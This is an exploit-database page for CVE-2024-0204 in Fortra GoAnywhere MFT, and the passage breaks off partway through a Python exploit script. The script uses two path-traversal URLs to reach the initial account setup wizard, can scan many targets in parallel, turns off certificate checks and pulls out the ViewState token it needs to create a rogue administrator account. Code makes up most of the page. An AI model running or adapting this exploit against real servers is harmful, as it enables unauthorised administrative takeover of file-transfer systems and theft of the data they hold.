---
title: Fortra GoAnywhere MFT 7.4.1 Authentication Bypass
url: https://cxsecurity.com/issue/WLB-2025060019
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-06-18
fetch_date: 2025-10-06T22:50:23.102254
---

# Fortra GoAnywhere MFT 7.4.1 Authentication Bypass

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Fortra GoAnywhere MFT 7.4.1 Authentication Bypass** **2025.06.17**  Credit:  **[@ibrahimsql](https://cxsecurity.com/author/%40ibrahimsql/1/)**  Risk: **Medium**  Local: ****Yes****  Remote: **No**  CVE: **[CVE-2024-0204](https://cxsecurity.com/cveshow/CVE-2024-0204/ "Click to see CVE-2024-0204")**  CWE: **N/A** | |

#!/usr/bin/env python3
# -\*- coding: utf-8 -\*-
# Exploit Title: Fortra GoAnywhere MFT 7.4.1 - Authentication Bypass
# Date: 2025-05-25
# Exploit Author: @ibrahimsql
# Exploit Author's github: https://github.com/ibrahimsql
# Vendor Homepage: https://www.fortra.com/products/secure-file-transfer/goanywhere-mft
# Software Link: https://www.fortra.com/products/secure-file-transfer/goanywhere-mft/free-trial
# Version: < 7.4.1
# Tested on: Kali Linux 2024.1
# CVE: CVE-2024-0204
# Description:
# Fortra GoAnywhere MFT versions prior to 7.4.1 contain a critical authentication bypass vulnerability
# that allows unauthenticated attackers to create an administrator account by exploiting a path traversal
# vulnerability to access the initial account setup wizard. This exploit demonstrates two different
# path traversal techniques to maximize successful exploitation across various server configurations.
#
# References:
# - https://old.rapid7.com/blog/post/2024/01/23/etr-cve-2024-0204-critical-authentication-bypass-in-fortra-goanywhere-mft/
# - https://www.tenable.com/blog/cve-2024-0204-fortra-goanywhere-mft-authentication-bypass-vulnerability
# - https://nvd.nist.gov/vuln/detail/cve-2024-0204
import argparse
import concurrent.futures
import os
import socket
import sys
from typing import List, Dict, Tuple, Optional, Union
import requests
from bs4 import BeautifulSoup
from colorama import Fore, Style, init
# Initialize colorama for cross-platform colored output
init(autoreset=True)
# Disable SSL warnings
requests.packages.urllib3.disable\_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
# Constants
DEFAULT\_TIMEOUT = 10
MAX\_THREADS = 10
USER\_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
PRIMARY\_EXPLOIT\_PATH = "/goanywhere/images/..;/wizard/InitialAccountSetup.xhtml"
SECONDARY\_EXPLOIT\_PATH = "/goanywhere/..;/wizard/InitialAccountSetup.xhtml"
class Banner:
@staticmethod
def show():
banner = f"""{Fore.CYAN}
██████╗██╗ ██╗███████╗ ██████╗ ██████╗ ██████╗ ██╗ ██╗ ██████╗ ██████╗ ██████╗ ██╗ ██╗
██╔════╝██║ ██║██╔════╝ ╚════██╗██╔═████╗╚════██╗██║ ██║ ██╔═████╗╚════██╗██╔═████╗██║ ██║
██║ ██║ ██║█████╗█████╗ █████╔╝██║██╔██║ █████╔╝███████║█████╗██║██╔██║ █████╔╝██║██╔██║███████║
██║ ╚██╗ ██╔╝██╔══╝╚════╝██╔═══╝ ████╔╝██║██╔═══╝ ╚════██║╚════╝████╔╝██║██╔═══╝ ████╔╝██║╚════██║
╚██████╗ ╚████╔╝ ███████╗ ███████╗╚██████╔╝███████╗ ██║ ╚██████╔╝███████╗╚██████╔╝ ██║
╚═════╝ ╚═══╝ ╚══════╝ ╚══════╝ ╚═════╝ ╚══════╝ ╚═╝ ╚═════╝ ╚══════╝ ╚═════╝ ╚═╝
{Style.RESET\_ALL}
{Fore.GREEN}CVE-2024-0204 Exploit v1.0{Fore.YELLOW} | {Fore.CYAN} Developer @ibrahimsql{Style.RESET\_ALL}
"""
print(banner)
class GoAnywhereExploit:
def \_\_init\_\_(self, username: str, password: str, timeout: int = DEFAULT\_TIMEOUT):
self.username = username
self.password = password
self.timeout = timeout
self.headers = {"User-Agent": USER\_AGENT}
self.vulnerable\_targets = []
self.non\_vulnerable\_targets = []
self.error\_targets = []
def check\_target(self, target: str) -> Dict:
"""
Check if target is vulnerable to CVE-2024-0204 and attempt to create an admin account
Args:
target: The target URL/domain to check
Returns:
Dict containing result information
"""
result = {
"target": target,
"vulnerable": False,
"message": "",
"admin\_created": False,
"error": None
}
# Try primary exploit path first
primary\_result = self.\_try\_exploit\_path(target, PRIMARY\_EXPLOIT\_PATH)
if primary\_result["vulnerable"]:
return primary\_result
# If primary path failed, try secondary exploit path
print(f"{Fore.BLUE}[\*] {Style.RESET\_ALL}Primary exploit path failed, trying alternative path...")
secondary\_result = self.\_try\_exploit\_path(target, SECONDARY\_EXPLOIT\_PATH)
if secondary\_result["vulnerable"]:
return secondary\_result
# If both paths failed, target is not vulnerable
print(f"{Fore.RED}[-] {Style.RESET\_ALL}{target} - Not vulnerable to CVE-2024-0204")
result["message"] = "Not vulnerable to CVE-2024-0204"
self.non\_vulnerable\_targets.append(target)
return result
def \_try\_exploit\_path(self, target: str, exploit\_path: str) -> Dict:
"""
Try to exploit the target using a specific exploit path
Args:
target: Target to exploit
exploit\_path: Path to use for exploitation
Returns:
Dict with exploitation results
"""
result = {
"target": target,
"vulnerable": False,
"message": "",
"admin\_created": False,
"error": None
}
try:
url = f"https://{target}{exploit\_path}"
session = requests.Session()
# Initial check for vulnerability
response = session.get(
url,
headers=self.headers,
verify=False,
timeout=self.timeout
)
# Determine if target is vulnerable based on response
if response.status\_code == 401:
print(f"{Fore.RED}[-] {Style.RESET\_ALL}{target} - Not vulnerable via {exploit\_path} (401 Unauthorized)")
result["message"] = "Not vulnerable (401 Unauthorized)"
return result
if response.status\_code != 200:
print(f"{Fore.YELLOW}[?] {Style.RESET\_ALL}{target} - Unexpected response via {exploit\_path} (Status: {response.status\_code})")
result["message"] = f"Unexpected response (Status: {response.status\_code})"
return result
# Target is potentially vulnerable
print(f"{Fore.GREEN}[+] {Style.RESET\_ALL}{target} - Potentially vulnerable via {exploit\_path}!")
result["vulnerable"] = True
self.vulnerable\_targets.append(target)
# Extract ViewState token for the form submission
try:
soup = BeautifulSoup(response.text, "html.parser")
view\_state = soup.find('input', {'name': 'javax.faces.ViewState'})
if not view\_state or not view\_state.get('value'):
print(f"{Fore.YELLOW}[!] {Style.RESET\_ALL}{target} - Could not extract ViewState token via {exploit\_path}")
result["message"] = "Could not extract ViewState token"
return result
# Prepare data for admi...